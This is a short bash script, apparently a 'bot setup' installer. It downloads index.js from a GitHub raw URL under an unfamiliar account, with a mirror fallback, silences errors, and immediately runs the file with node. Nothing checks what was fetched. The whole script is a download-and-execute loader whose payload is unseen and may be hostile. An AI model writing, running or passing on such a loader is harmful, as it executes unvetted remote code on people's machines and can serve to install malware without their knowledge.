#!/usr/bin/env bash
set -e

DIR="${BOT_DIR:-$HOME/bots}"
mkdir -p "$DIR"

if ! command -v node >/dev/null 2>&1; then
  echo "node is required but not found" >&2
  exit 1
fi

URLS=(
  "https://raw.githubusercontent.com/malasahjagotwin/cgo/main/setup/bots/index.js"
  "https://github.com/malasahjagotwin/cgo/raw/refs/heads/main/setup/bots/index.js"
)

fetch() {
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --max-time 20 "$1"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO - --timeout 20 "$1"
  else
    return 1
  fi
}

tmp="$DIR/index.js.tmp"
for u in "${URLS[@]}"; do
  if fetch "$u" > "$tmp" 2>/dev/null && [ -s "$tmp" ]; then
    mv "$tmp" "$DIR/index.js"
    cd "$DIR"
    exec node index.js
  fi
done
rm -f "$tmp"
echo "failed to download bot setup script" >&2
exit 1